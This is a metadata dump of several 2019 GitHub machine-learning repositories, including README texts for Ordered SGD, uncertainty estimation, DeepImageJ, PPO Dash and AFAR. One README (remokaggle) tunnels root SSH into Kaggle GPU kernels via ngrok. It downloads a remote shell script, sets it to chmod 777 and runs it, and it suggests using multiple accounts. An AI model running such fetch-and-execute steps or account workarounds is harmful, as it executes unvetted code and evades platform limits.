k9k2,qSGD,n/a,Ordered SGD a simple modification of SGD to accelerate training and improve test accuracy This repo consists Pytorch code for Ordered SGD A New Stochastic Optimization Framework for Empirical Risk Minimization https arxiv org abs 1907 04371 The proposed algorithm Ordered SGD is fast computationally efficient is easy to be implemented and comes with theoretical gurantees in both optimization and generalization Implementing Ordered SGD only requires modifications of one line or few lines in any code that uses SGD The Ordered SGD algorithm accelerates training and improves test accuracy by focusing on the important data samples The following figure illustrates the advantage of Ordered SGD in that Ordered SGD learns a different type of models than those learned by the standard SGD which is often beneficial As a result of the above mechanism and other theoretical facts Ordered SGD is fast and can improve test errors as shown in the following figure and tables CIFAR 10 with WideResNet2810 Method test error SGD 3 24 Ordered SGD 3 06 If you find this useful in your research please consider citing articleosgd2019kh title Ordered SGD A New Stochastic Optimization Framework for Empirical Risk Minimization author Kawaguchi Kenji and Lu Haihao journal arXiv preprint arXiv 1907 04371 year 2019 In this paper we propose a new stochastic first order method for empirical risk minimization problems such as those that arise in machine learning The traditional approaches such as mini batch stochastic gradient descent SGD utilize an unbiased gradient estimator of the empirical average loss In contrast we develop a computationally efficient method to construct a gradient estimator that is purposely biased toward those observations with higher current losses and that itself is an unbiased gradient estimator of an ordered modification of the empirical average loss On the theory side we show that the proposed algorithm is guaranteed to converge at a sublinear rate to a global optimum for convex loss and to a critical point for non convex loss Furthermore we prove a new generalization bound for the proposed algorithm On the empirical side we present extensive numerical experiments in which our proposed method consistently improves the test errors compared with the standard mini batch SGD in various models including SVM logistic regression and non convex deep learning problems How to modify your own code to use Ordered SGD Implementing Ordered SGD only requires modifications of one line or few lines in any code that uses SGD For example in pytorch suppose that you have the following lines loss F crossentropy modeloutput y loss backward optimizer step where optimizer is the SGD optimizer Then you can implement Ordered SGD by simply re writing these lines to the following lines loss F crossentropy modeloutput y reduction none loss torch mean torch topk loss min q s sorted False dim 0 0 loss backward optimizer step where s is the mini batch size e g s 64 and q is the hyper parameter of Ordered SGD e g q 32 To avoid hyper parameter search for the value of q we used the following rule to automatically adjust q across all the experiments q s at the beginning of training q int s 2 once trainacc 80 q int s 4 once trainacc 90 q int s 8 once trainacc 95 and q int s 16 once trainacc 99 5 where trainacc represents training accuracy if trainacc 99 5 and q int s 16 q int s 16 elif trainacc 95 and q int s 8 q int s 8 elif trainacc 90 and q int s 4 q int s 4 elif trainacc 80 and q int s 2 q int s 2 How to run this code Examples for networks other than WideResNet2810 Use the following commond in the root folder for training LeNet on MNIST via SGD without data augmentation python main py dataset mnist data aug 0 model LeNet method 0 LeNet on MNIST via Ordered SGD without data augmentation python main py dataset mnist data aug 0 model LeNet method 1 LeNet on KMNIST via Ordered SGD with data augmentation python main py dataset kmnist data aug 1 model LeNet method 1 LeNet on Fashion MNIST via Ordered SGD with data augmentation python main py dataset fashionmnist data aug 1 model LeNet method 1 PreActResNet18 on CIFAR 10 via SGD without data augmentation python main py dataset cifar10 data aug 0 model PreActResNet18 method 0 PreActResNet18 on CIFAR 10 via Ordered SGD without data augmentation python main py dataset cifar10 data aug 0 model PreActResNet18 method 1 PreActResNet18 on CIFAR 10 via SGD with data augmentation python main py dataset cifar10 data aug 1 model PreActResNet18 method 0 PreActResNet18 on CIFAR 10 via Ordered SGD with data augmentation python main py dataset cifar10 data aug 1 model PreActResNet18 method 1 After training via both SGD and Ordered SGD use the following commond in the root folder for plotting LeNet on MNIST without data augmentation python plot py dataset mnist data aug 0 model LeNet LeNet on MNIST with data augmentation python plot py dataset mnist data aug 1 model LeNet LeNet on KMNIST with data augmentation python plot py dataset kmnist data aug 1 model LeNet LeNet on Fashion MNIST with data augmentation python plot py dataset fashionmnist data aug 1 model LeNet PreActResNet18 on CIFAR 10 with data augmentation python plot py dataset cifar10 data aug 1 model PreActResNet18 WideResNet2810 Use the following commond in folder cifar10WideResNet for SGD python cifar py dataset cifar10 p 0 5 arch wrn depth 28 widen factor 10 schedule 100 200 method 0 for Ordered SGD python cifar py dataset cifar10 p 0 5 arch wrn depth 28 widen factor 10 schedule 100 200 method 1 Disclaimer the code for WideResNet2810 with CIFAR 10 is based on the code from random erasing repo https github com zhunzhong07 Random Erasing This code has been tested with Python 3 6 7 torch 1 0 1,2019-07-09T17:38:31Z,2019-11-05T02:20:41Z,Python,k9k2,User,1,14,1,26,master,k9k2,1,0,0,0,0,0,0
lamhoangtung,remokaggle,deep-learning#kaggle-kernel#p100#ssh-free,Remokaggle rocket A quick script to setup SSH to Kaggle Kernel for Deep Learning In order to use that sexy P100 for free and without many restriction of Jupyter Notebook P Preparation 1 Go to https dashboard ngrok com auth and get your authentication token after register with Google or Github You only have to do this once 2 Modify the getssh py getssh py file 1 Replace your ngrok authentication token at line 7 in 2 Set a password for your user at line 10 just in case you need it we will use SSH Key authentication from now on 3 Create a public Github Gist https gist github com with file name authorizedkeys and paste your public SSH key usually located at ssh idrsa pub as the content of the gist 4 If you don t have an SSH key RSA Key Pair please refer to the first step in this article https www digitalocean com community tutorials how to set up ssh keys on ubuntu 1804 4 Replace the link to raw content of your gist at line 11 How to setup SSH connection Step 1 Create a new Kaggle kernel https www kaggle com kernels Step 2 Go to Kernel Settings and turn on GPU and Internet setting fig setting png Step 3 Copy the whole content of the modified getssh py getssh py and paste to the kernel as the first block of code kernel fig kernel png Step 4 Click Commit on the top right conner and wait a minutes for everything to set up You should see a pop up windows like this commit fig commit png Save the host address information tcp 0 tcp ngrok io 16360 to SSH If some how you forget the host address and port go to your Ngrok Dashboard Status and you will found them again How to SSH ssh root 0 tcp ngrok io p 16360 port number dictated in above output With root password also dictated in above output You won t have to use the password since we already used SSH key authentication to logging into your server You can turn off the browser disconnect from the server and it will still running But keep in mind this server can only live for 9 hours at max How to quickly setup the server Kaggle Kernel already provide many Machine Learning and Deep Learning package and library ready to use with a powerful NVIDIA Tesla P100 GPU so you might be good to go But if you want something more that I usually use Run this to get more bash cd wget https github com lamhoangtung kaggle kernel setup raw master installcommon sh chmod 777 installcommon sh installcommon sh And follow the instruction You only need to Commit again in the same kernel to get everything up and running again after terminate the server Host address information will be reset each time you commit You will need multiple Kaggle account and multiple ngrok account to get multiple server running at the same time How to terminate the server Go to https www kaggle com kernels and look at the Your Recent Kernels section and hit Stop stop fig stop png If you encounter any problem while setting up the connection Please terminate the server as above Then open the kernel in editor mode and go to Run Power off then turn it on manually poweroff fig poweroff png Keep in mind everything will be lost including process and files when you Power off or Terminate the kernel Feels free to contribute to this tiny repo since I don t have much experience with bash and linux All Pull Request are welcomed heart,2019-07-08T07:01:46Z,2019-12-09T06:17:03Z,Python,lamhoangtung,User,0,14,1,33,master,lamhoangtung,1,0,0,0,2,0,0
ahmedmalaa,uncertainty,deep-learning#deep-neural-networks#uncertainty-quantification,Uncertainty Quantification in Deep Learning Python 3 6 https img shields io badge Platform Python 203 6 blue svg https www python org PyTorch 1 1 0 https img shields io badge Implementation Pytorch brightgreen svg https pytorch org This repo contains a literature survey and benchmark implementation for various approaches for predictive uncertainty estimation for deep learning models Literature survey Basic background for uncertainty estimation B Efron and R Tibshirani Bootstrap methods for standard errors confidence intervals and other measures of statistical accuracy Statistical science 1986 Link https www jstor org stable pdf 2245500 pdf R Barber E J Candes A Ramdas and R J Tibshirani Predictive inference with the jackknife arXiv 2019 Link https arxiv org abs 1905 02928 B Efron Jackknifeafterbootstrap standard errors and influence functions Journal of the Royal Statistical Society Series B Methodological 1992 Link https rss onlinelibrary wiley com doi abs 10 1111 j 2517 6161 1992 tb01866 x J Robins and A Van Der Vaart Adaptive nonparametric confidence sets The Annals of Statistics 2006 Link https projecteuclid org download pdfview1 euclid aos 1146576262 V Vovk et al Cross conformal predictive distributions JMLR 2018 Link http proceedings mlr press v91 vovk18a vovk18a pdf M H Quenouille Approximate tests of correlation in time series Journal of the Royal Statistical Society 1949 Link https www jstor org stable 2983696 seq 1 metadatainfotabcontents M H Quenouille Notes on bias in estimation Biometrika 1956 Link https www jstor org stable 2332914 seq 1 metadatainfotabcontents J Tukey Bias and confidence in not quite large samples Ann Math Statist 1958 R G Miller The jackknifea review Biometrika 1974 Link https www jstor org stable 2334280 seq 1 metadatainfotabcontents B Efron Bootstrap methods Another look at the jackknife Ann Statist 1979 Link https projecteuclid org euclid aos 1176344552 R A Stine Bootstrap prediction intervals for regression Journal of the American Statistical Association 1985 Link https amstat tandfonline com doi abs 10 1080 01621459 1985 10478220 R F Barber E J Candes A Ramdas and R J Tibshirani Conformal prediction under covariate shift arXiv preprint arXiv 1904 06019 2019 Link https arxiv org pdf 1904 06019 pdf R F Barber E J Candes A Ramdas and R J Tibshirani The limits of distribution free conditional predictive inference arXiv preprint arXiv 1903 04684 2019b Link https arxiv org pdf 1903 04684 pdf J Lei M G Sell A Rinaldo R J Tibshirani and L Wasserman Distribution free predictive inference for regression Journal of the American Statistical Association 2018 Link https www tandfonline com doi pdf 10 1080 01621459 2017 1307116 R Giordano M I Jordan and T Broderick A Higher Order Swiss Army Infinitesimal Jackknife arXiv 2019 Link https arxiv org pdf 1907 12116 pdf P W Koh K Ang H H K Teo and P Liang On the Accuracy of Influence Functions for Measuring Group Effects arXiv 2019 Link https arxiv org pdf 1905 13289 pdf D H Wolpert Stacked generalization Neural networks 1992 Link https citeseerx ist psu edu viewdoc download doi 10 1 1 133 8090 rep rep1 type pdf R D Cook and S Weisberg Residuals and influence in regression New York Chapman and Hall 1982 Link https conservancy umn edu handle 11299 37076 R Giordano W Stephenson R Liu M I Jordan and T Broderick A Swiss Army Infinitesimal Jackknife arXiv preprint arXiv 1806 00550 2018 Link https arxiv org pdf 1806 00550 pdf P W Koh and P Liang Understanding black box predictions via influence functions ICML 2017 Link https dl acm org citation cfm id 3305576 S Wager and S Athey Estimation and inference of heterogeneous treatment effects using random forests Journal of the American Statistical Association 2018 Link https www tandfonline com doi full 10 1080 01621459 2017 1319839 J F Lawless and M Fredette Frequentist prediction intervals and predictive distributions Biometrika 2005 Link https ideas repec org a oup biomet v92y2005i3p529 542 html F R Hampel E M Ronchetti P J Rousseeuw and W A Stahel Robust statistics the approach based on influence functions John Wiley and Sons 2011 Link https www wiley com en us Robust Statistics 3A The Approach Based on Influence Functions p 9781118150689 P J Huber and E M Ronchetti Robust Statistics John Wiley and Sons 1981 Y Romano R F Barber C Sabatti E J Cands With Malice Towards None Assessing Uncertainty via Equalized Coverage arXiv 2019 Link https arxiv org pdf 1908 05428 pdf H R Kunsch The Jackknife and the Bootstrap for General Stationary Observations The annals of Statistics 1989 Link https www jstor org stable pdf 2241719 pdf Predictive uncertainty for general machine learning models S Wager T Hastie and B Efron Confidence intervals for random forests The jackknife and the infinitesimal jackknife The Journal of Machine Learning Research 2014 Link http jmlr org papers volume15 wager14a wager14a pdf L Mentch and G Hooker Quantifying uncertainty in random forests via confidence intervals and hypothesis tests The Journal of Machine Learning Research 2016 Link http jmlr org papers volume17 14 168 14 168 pdf J Platt Probabilistic outputs for support vector machines and comparisons to regularized likelihood methods Advances in large margin classifiers 1999 Link https www researchgate net profile JohnPlatt publication 2594015ProbabilisticOutputsforSupportVectorMachinesandComparisonstoRegularizedLikelihoodMethods links 004635154cff5262d6000000 pdf A Abadie S Athey G Imbens Sampling based vs design based uncertainty in regression analysis arXiv preprint arXiv 1706 01778 2017 Link https arxiv org pdf 1706 01778 pdf T Duan A Avati D Y Ding S Basu Andrew Y Ng and A Schuler NGBoost Natural Gradient Boosting for Probabilistic Prediction arXiv preprint 2019 Link https arxiv org pdf 1910 03225 pdf V Franc and D Prusa On Discriminative Learning of Prediction Uncertainty ICML 2019 Link http proceedings mlr press v97 franc19a franc19a pdf Predictive uncertainty for deep learning J A Leonard M A Kramer and L H Ungar A neural network architecture that computes its own reliability Computers chemical engineering 1992 Link https www sciencedirect com science article pii 0098135492800358 C Blundell J Cornebise K Kavukcuoglu and D Wierstra Weight uncertainty in neural networks ICML 2015 Link https arxiv org pdf 1505 05424 pdf B Lakshminarayanan A Pritzel and C Blundell Simple and scalable predictive uncertainty estimation using deep ensembles NeurIPS 2017 Link http papers nips cc paper 7219 simple and scalable predictive uncertainty estimation using deep ensembles pdf Y Gal and Z Ghahramani Dropout as a Bayesian Approximation Representing Model Uncertainty in Deep Learning ICML 2016 Link https arxiv org pdf 1506 02142 pdf V Kuleshov N Fenner and S Ermon Accurate Uncertainties for Deep Learning Using Calibrated Regression ICML 2018 Link http proceedings mlr press v80 kuleshov18a kuleshov18a pdf J Hernndez Lobato and R Adams Probabilistic backpropagation for scalable learning of bayesian neural networks ICML 2015 Link http proceedings mlr press v37 hernandez lobatoc15 pdf S Liang Y Li and R Srikant Enhancing The Reliability of Out of distribution Image Detection in Neural Networks ICLR 2018 Link https openreview net forum id H1VGkIxRZ K Lee H Lee K Lee and J Shin Training Confidence calibrated classifiers for detecting out of distribution samples ICLR 2018 Link https openreview net forum id ryiAv2xAZ P Schulam and S Saria Can You Trust This Prediction Auditing Pointwise Reliability After Learning AISTATS 2019 Link http proceedings mlr press v89 schulam19a schulam19a pdf A Malinin and M Gales Predictive uncertainty estimation via prior networks NeurIPS 2018 Link http papers nips cc paper 7936 predictive uncertainty estimation via prior networks pdf D Hendrycks M Mazeika and T G Dietterich Deep anomaly detection with outlier exposure arXiv preprint arXiv 1812 04606 2018 Link https arxiv org pdf 1812 04606 pdf D Madras J Atwood A D Amour Detecting Extrapolation with Influence Functions ICML Workshop on Uncertainty and Robustness in Deep Learning 2019 Link http www gatsby ucl ac uk balaji udl2019 accepted papers UDL2019 paper 05 pdf M Sensoy L Kaplan and M Kandemir Evidential deep learning to quantify classification uncertainty NeurIPS 2018 Link https papers nips cc paper 7580 evidential deep learning to quantify classification uncertainty pdf W Maddox T Garipov P Izmailov D Vetrov and A G Wilson A simple baseline for bayesian uncertainty in deep learning arXiv preprint arXiv 1902 02476 2019 Link https arxiv org pdf 1902 02476 pdf Y Ovadia et al Can You Trust Your Model s Uncertainty Evaluating Predictive Uncertainty Under Dataset Shift arXiv preprint arXiv 1906 02530 2019 Link https arxiv org pdf 1906 02530 pdf D Hendrycks et al Using Self Supervised Learning Can Improve Model Robustness and Uncertainty arXiv preprint arXiv 1906 12340 2019 Link https arxiv org pdf 1906 12340 pdf A Kumar P Liang T Ma Verified Uncertainty Calibration arXiv preprint 2019 Link https arxiv org abs 1909 10155 I Osband C Blundell A Pritzel and B Van Roy Deep Exploration via Bootstrapped DQN NeurIPS 2016 Link https papers nips cc paper 6501 deep exploration via bootstrapped dqn pdf I Osband Risk versus Uncertainty in Deep Learning Bayes Bootstrap and the Dangers of Dropout NeurIPS Workshop 2016 Link http bayesiandeeplearning org 2016 papers BDL4 pdf J Postels et al Sampling free Epistemic Uncertainty Estimation Using Approximated Variance Propagation ICCV 2019 Link http openaccess thecvf com contentICCV2019 papers PostelsSampling FreeEpistemicUncertaintyEstimationUsingApproximatedVariancePropagationICCV2019paper pdf A Kendall and Y Gal What Uncertainties Do We Need in Bayesian Deep Learning for Computer Vision NeurIPS 2017 Link https arxiv org pdf 1703 04977 pdf N Tagasovska and D Lopez Paz Single Model Uncertainties for Deep Learning NeurIPS 2019 Link https papers nips cc paper 8870 single model uncertainties for deep learning pdf A Der Kiureghian and O Ditlevsen Aleatory or Epistemic Does it Matter Structural Safety 2009 Link https www sciencedirect com science article pii S0167473008000556 D Hafner D Tran A Irpan T Lillicrap and J Davidson Reliable uncertainty estimates in deep neural networks using noise contrastive priors arXiv 2018 Link https arxiv org pdf 1807 09289 pdf S Depeweg J M Hernndez Lobato F Doshi Velez and S Udluft Decomposition of uncertainty in Bayesian deep learning for efficient and risk sensitive learning ICML 2018 Link http publications eng cam ac uk 945907 L Smith and Y Gal Understanding Measures of Uncertainty for Adversarial Example Detection UAI 2018 Link https arxiv org pdf 1803 08533 pdf L Zhu and N Laptev Deep and Confident Prediction for Time series at Uber IEEE International Conference on Data Mining Workshops 2017 Link https ieeexplore ieee org stamp stamp jsp arnumber 8215650 Predictive uncertainty in sequential models R Wen K Torkkola B Narayanaswamy and D Madeka A Multi horizon Quantile Recurrent Forecaster arXiv 2017 D T Mirikitani and N Nikolaev Recursive bayesian recurrent neural networks for time series modeling IEEE Transactions on Neural Networks 2009 Link https ieeexplore ieee org stamp stamp jsp arnumber 5361332 M Fortunato C Blundell and O Vinyals Bayesian Recurrent Neural Networks arXiv 2019 Link https arxiv org pdf 1704 02798 pdf P L McDermott C K Wikle Bayesian Recurrent Neural Network Models for Forecasting and Quantifying Uncertainty in Spatial Temporal Data Entropy 2019 Link https www mdpi com 1099 4300 21 2 184 Implemented baselines Bayesian neural networks Pyro Monte Carlo dropout PyTorch Bayes by backprop PyTorch Probabilistic backprop Naive Jackknife Jackknife minmax and Jackknife PyTorch Cross conformal and split conformal learning PyTorch Deep ensembles Tensorflow Resampling uncertainty estimation PyTorch,2019-06-29T03:49:18Z,2019-12-14T17:53:57Z,Python,ahmedmalaa,User,1,13,1,77,master,ahmedmalaa,1,0,0,0,0,0,0
jaimezorno,Deep-Learning-for-NLP-Creating-a-Chatbot,n/a,,2019-07-17T21:17:39Z,2019-10-06T01:52:18Z,Jupyter Notebook,jaimezorno,User,0,12,27,2,master,jaimezorno,1,0,0,0,0,0,0
deepimagej,deepimagej-plugin,n/a,DeepImageJ WORK IN PROGRESS This is unfinished project that is still being developed The ImageJ plugin to run deep learning models DeepImageJ is a user friendly plugin that enables the use of a variety of pre trained deep learning models in ImageJ The plugin bridges the gap between deep learning and standard life science applications DeepImageJ runs image to image operations on a standard CPU based computer and does not require any deep learning expertise One click Installation Go to releases https github com deepimagej deepimagej plugin releases and download the last version of the plugin The ZIP file DeepImageJ zip is a plugin for ImageJ or Fiji It contains all the necessary libraries JAR files and DeepImageJX X X jar to load and run TensorFlow models on any OS Windows Mac OSX Linux Unzip the ZIP file and store the 5 JAR files into the plugins folder of ImageJ or Fiji Create the folder models inside ImageJ Fiji directory ImageJ models Download a bundled model https deepimagej github io deepimagej models html unzip it into the directory models and run it over your image System requirements Operating systems same requirements as for ImageJ Fiji software Windows Mac OSX Linux The java libraries insided ImageJ Fiji needed to run this plugin are libtensorflow 1 12 0 libtensorflowjni 1 12 0 proto 1 2 0 protobuf java 3 2 0 Conditions of use The DeepImageJ project is an open source software OSS under the BSD 2 Clause License All the resources provided here are freely available for noncommercial and research purposes Their use for any other purpose is generally possible but solely with the explicit permission of the authors You are expected to include adequate references whenever you present or publish results that are based on the resources provided References Cite the appropriate TensorFlow network which is bundled into DeepImageJ E Gmez de Mariscal C Garca Lpez de Haro L Donati M Unser A Muoz Barrutia D Sage DeepImageJ A user friendly plugin to run deep learning models in ImageJ BioRxiv 2019 https www biorxiv org content 10 1101 799270v2 Further information https deepimagej github io deepimagej,2019-07-30T09:38:03Z,2019-12-07T12:21:35Z,Java,deepimagej,User,5,12,3,174,master,carlosuc3m#deepimagej#esgomezm#ctrueden,4,1,1,1,2,1,9
Sohojoe,ppo-dash,n/a,PPO Dash Code for reproducing the results found in PPO Dash Improving Generalization in Deep Reinforcement Learning https arxiv org abs 1907 06704 About PPO Dash is a modified version of the PPO algrothem that utalises the following optimizations and best practices Action Space Reduction Frame Stack Reduction Large Scale Hyperparameters Vector Observations Normalized Observations Reward Hacking Recurrent Memory PPO Dash was able to solve the first 10 levels of the Obsticle Tower Enviroment without the need for demonstrations or curosity based algorthemic enhancements The version of PPO Dash in the technical paper placed 2nd https blogs unity3d com 2019 05 15 obstacle tower challenge round 2 begins today in Round One of the Obsticle Tower Challenge https www aicrowd com challenges unity obstacle tower challenge with an average score of 10 We were able to reproduce this score in Round Two of the challenge with a minor modifiaction randomizing the themes during in training We placed 4th overall https www aicrowd com challenges unity obstacle tower challenge leaderboards with a score of 10 8 with the addition of demonstrations Reproducing Results To reproduce the results listed in the paper and for round one of the competition see ReproduceRound1 ReproduceRound1 md Acknowlegements This codebase derives from pytorch a2c ppo acktr https github com ikostrikov pytorch a2c ppo acktr gail 8258f95 https github com ikostrikov pytorch a2c ppo acktr gail commit 8258f95d6c1959d02c6a412415138b95c32837a0 Citation If you use PPO Dash in your research we ask that you cite the technical report https arxiv org abs 1907 06704 as a reference,2019-07-17T05:52:00Z,2019-12-09T13:08:20Z,Python,Sohojoe,User,0,12,2,3,master,Sohojoe,1,0,0,0,0,0,0
AffectAnalysisGroup,AFARtoolbox,n/a,Automated Facial Affect Recognition AFAR Automated measurement of face and head dynamics detection of facial action units and expression and affect detection are crucial to multiple domains e g health education entertainment Commercial tools are available but costly and of unknown validity Open source ones lack user friendly GUI for use by non programmers For both types evidence of domain transfer and options for retraining for use in new domains typically are lacking Deep approaches have two key advantages They typically outperform shallow ones for facial affect recognition And pre trained models provided by deep approaches can be fine tuned with new datasets to optimize performance AFAR is an open source deep learning based user friendly tool for automated facial affect recognition It consists of a pipeline having four components i face tracking ii face registration iii action unit AU detection and iv visualization Moreover finetuning component allows the interested users to finetune the pretrained AU detection models with their own dataset AFAR has been used in comparative studies of action unit detectors 1 https www jeffcohn net wp content uploads 2019 07 BMVC2019PAttNet pdf pdf 2 http www jeffcohn net wp content uploads 2019 07 ACII20193DCNN pdf and to investigate cross domain generalizability 3 https ieeexplore ieee org abstract document 8756543 assess treatment response to deep brain stimulation DBS for treatment resistant obsessive compulsive disorder 4 https dl acm org citation cfm id 3243023 and to explore facial dynamics in young children 5 https journals lww com prsgo Fulltext 2019 01000 DynamicsofFaceandHeadMovementinInfantswith 9 aspx and in adults in treatment for depression 6 https www ncbi nlm nih gov pubmed 28278485 among other research afarpipeline https user images githubusercontent com 12033328 61708950 15539700 ad1c 11e9 85a7 23d1db0475ac png Required OpenCV https opencv org mexopencv https github com kyamagu mexopencv MATLAB add on Deep Learning Toolbox Converter for ONNX Model Format Modules ZFace Folder structure 3rdparty arrow3Dpub 3D arrow display code mexopencv MATLAB OpenCV wrapper opencv2 4 11x64vc11dlls OpenCV dlls testimages test images of different celebrities testvideo test video ZFacemodels tracking models ZFacesrc SDK source files Using the SDK The SDK is organized into classes The CZFace class located in ZFaceSrc is the central way we use the tracker We can simply create an instance of the tracker zf CZFace ZFacemodelszfctrl49mesh512 mat And track a given image I ctrl2D mesh2D mesh3D pars zf Fit I The current version of ZFace has the following output ctrl2D The 2D locations of the measured facial landmarks mesh3D The reconstructed dense 3D mesh in a canonical view without rigid transformations mesh2D Projection of the 3D mesh to 2D pars Shape parameters in the following order 1 uniform scaling 2 3 translation x y direction 4 6 headpose using Euler angles pitch 4 yaw 5 roll 6 in radians 7 non rigid PDM Point Distribution Model parameters For more details please refer to the included demo files DemoCamera m DemoImages m DemoVideo m The SDK uses the mexopencv wrapper https github com kyamagu mexopencv It has been compiled with the 64 bit OpenCV 2 4 11 for 64bit Windows The dlls are in the opencv2 4 11x64vc11dlls folder They have to be included in the system path start menu environment variables sytem variables path Troubleshooting If you are getting an Invalid MEX file error from the mexopencv wrapper try to re compile it mexopencv make clean true mexopencv make FETA AU Detector This code uses output of FETA which is run with the following parameters Resolution 200 Interocular distance 80 You can run the code on the sample video samplevideonorm mp4 of size 200 x 200 x 3 Probabilities of 12 AUs are saved to the file named samplevideonormresult mat These AUs are AU1 AU2 AU4 AU6 AU7 AU10 AU12 AU14 AU15 AU17 AU23 and AU24 AFAR Finetune AFAR Finetune module is written in PyTorch With this module you can finetune pretained AU detector models trained on EB dataset You can also obtain AU probabilities for frames videos Finetuning code and models can be found in AFARfinetune codes You can run the following command python afarfinetune py We share two types of pretrained models Model trained using the frames after mean frame of the video is subtracted Model trained using the raw frames To finetune Change trainmode 1 Extract frames of videos in your dataset Prepare your traintxtfile that includes path name of the frame and its AU labels in the given order AU1 AU2 AU4 AU6 AU7 AU10 AU12 AU14 AU15 AU17 AU23 and AU24 If you want to use the model trained on mean subtracted frames i compute mean frames of each video ii save them under a folder and iii set meanimagepath that contains the mean frames of videos in your dataset to that folder Pretrained models will be saved to savedmodels folder for each epoch To test a video Change trainmode 0 Videomode 1 Frames of the video will be tested in batches since for large videos all frames may not fit to GPU Adjust videotestbatchsize parameter if the default is too large for your GPU Set your video path videopath and video name videon To test your dataset using frames and a txt file containing the paths and names of frames Change trainmode 0 Videomode 0 Precompute the scalar mean of your dataset grayscale and assign grayscalemeanofdataset to this value Set your testtxtfile and testtxtfilename If you want to use the model trained on mean subtracted frames i compute mean frames of each video ii save them under a folder and iii set meanimagepath that contains the mean frames of videos in your dataset to that folder Citation If you use any of the resources provided on this page please cite the pipeline paper and papers relevant to the components you used Pipeline inproceedingsertugrul2019afar title AFAR A Deep Learning Based Tool for Automated Facial Affect Recognition author Onal Ertugrul Itir and Jeni L aszl o A and Ding Wanqiao and Cohn Jeffrey F booktitle 2019 14th IEEE International Conference on Automatic Face Gesture Recognition FG 2019 year 2019 organization IEEE AU detector and AFAR finetune inproceedingsertugrul2019cross title Cross domain AU Detection Domains Learning Approaches and Measures author Onal Ertugrul Itir and Cohn Jeffrey F and Jeni L aszl o A and Zhang Zheng and Yin Lijun and Ji Qiang booktitle 2019 14th IEEE International Conference on Automatic Face Gesture Recognition FG 2019 year 2019 organization IEEE ZFace articlejeni2017dense title Dense 3d face alignment from 2d video for real time use author Jeni L aszl o A and Cohn Jeffrey F and Kanade Takeo journal Image and Vision Computing volume 58 pages 13 24 year 2017 publisher Elsevier inproceedingsjeni2015dense title Dense 3D face alignment from 2D videos in real time author Jeni L aszl o A and Cohn Jeffrey F and Kanade Takeo booktitle 2015 11th IEEE international conference and workshops on automatic face and gesture recognition FG year 2015 organization IEEE Links to the papers Cross domain AU detection Domains Learning Approaches and Measures https www jeffcohn net wp content uploads 2019 02 FG2019crossdomainfinalversion pdf AFAR A Deep Learning Based Tool for Automated Facial Affect Recognition https www jeffcohn net wp content uploads 2019 07 FG2019demopaper pdf pdf Dense 3d face alignment from 2d video for real time use http www laszlojeni com pub articles Jeni16ImaVisZFace pdf Dense 3D face alignment from 2D videos in real time http www laszlojeni com pub articles Jeni15FGZFace pdf Use AFAR GUI Make sure run pipelineMain m under the same path where each module s folder is That s the default module location Otherwise you have to check and manually change the locations of ZFace FETA AUDetector directory License AFAR is freely available for free non commercial use and may be redistributed under these conditions Please see the license LICENSE for further details Interested in a commercial license Please contact Jeffrey Cohn http www jeffcohn net,2019-07-22T20:15:00Z,2019-11-19T13:15:31Z,MATLAB,AffectAnalysisGroup,Organization,6,12,3,244,master,wanqiaod#itironal,2,0,0,0,0,0,0
PengyiZhang,MIADeepSSL,n/a,MIADeepSSL A Survey on Deep Learning of Small Sample in Biomedical Image Analysis This page is for the A Survey on Deep Learning of Small Sample in Biomedical Image Analysis https arxiv org abs 1908 00473 We build MIADeepSSL demos using surveyed small sample learning techniques for deep learning in Biomedical Image Analysis img chart jpg Abstract The success of deep learning has been witnessed as a promising technique for computer aided biomedical image analysis due to end to end learning framework and availability of large scale labelled samples However in many cases of biomedical image analysis deep learning techniques suffer from the small sample learning SSL dilemma caused mainly by lack of annotations To be more practical for biomedical image analysis in this paper we survey the key SSL techniques that help relieve the suffering of deep learning by combining with the development of related techniques in computer vision applications In order to accelerate the clinical usage of biomedical image analysis based on deep learning techniques we intentionally expand this survey to include the explanation methods for deep models that are important to clinical decision making We survey the key SSL techniques by dividing them into five categories 1 explanation techniques 2 weakly supervised learning techniques 3 transfer learning techniques 4 active learning techniques and 5 miscellaneous techniques involving data augmentation domain knowledge traditional shallow methods and attention mechanism These key techniques are expected to effectively support the application of deep learning in clinical biomedical image analysis and furtherly improve the analysis performance especially when large scale annotated samples are not available Requirements 1 pytorch 1 0 1 explanation techniques 2 weakly supervised learning techniques 3 transfer learning techniques 4 active learning techniques 5 miscellaneous techniques 1 data augmentation 2 domain knowledge 3 traditional shallow methods 4 attention mechanism TODO Build MIADeepSSL demo using explanation techniques Build MIADeepSSL demo using weakly supervised learning techniques Build MIADeepSSL demo using transfer learning techniques Build MIADeepSSL demo using active learning techniques Build MIADeepSSL demo using attention mechanism Build MIADeepSSL demo using traditional shallow methods Build MIADeepSSL demo using domain knowledge Citation If you find this code useful for your research please cite our paper article author Pengyi Zhang Yunxin Zhong Yulin Deng Xiaoying Tang Xiaoqiong Li title A Survey on Deep Learning of Small Sample in Biomedical Image Analysis journal CoRR volume abs 1908 00473 year 2019 ee https arxiv org abs 1908 00473,2019-08-01T14:59:30Z,2019-11-22T14:24:08Z,n/a,PengyiZhang,User,8,12,1,5,master,PengyiZhang,1,0,0,1,0,0,0
TankZhouFirst,clinical-grade-computational-pathology-using-weakly-supervised-deep-learning-on-whole-slide-images,n/a,AI AI498 75 https mp weixin qq com s I1mSPWuvSikE ltS63PK4Q Github https github com MSKCC Computational Pathology MIL nature medicine 2019 1 50G https pan baidu com s 14FZ5KDpGd id9rTYtKi5fw i8fv 2 code README md code dataPrepareforCNN py code dataPrepareforRnn py 3 GPU code README md 4 1 code dataPrepareforCNN py MIL 2 code MILtrain py code MILtest py 3 code dataPrepareforRnn py RNN 4 code RNNtrain py code RNNtest py doc images png MIL Pred target 1 0 1 11 1 0 2 31 ACC 42 45 93 3 FNR 2 13 15 4 FPR 1 32 3 1 RNN Pred target 1 0 1 12 1 0 1 31 ACC 43 45 95 6 FNR 1 13 7 7 FPR 1 32 3 1,2019-07-24T09:31:20Z,2019-12-01T04:39:38Z,Python,TankZhouFirst,User,0,11,4,12,master,TankZhouFirst,1,0,0,3,1,0,0
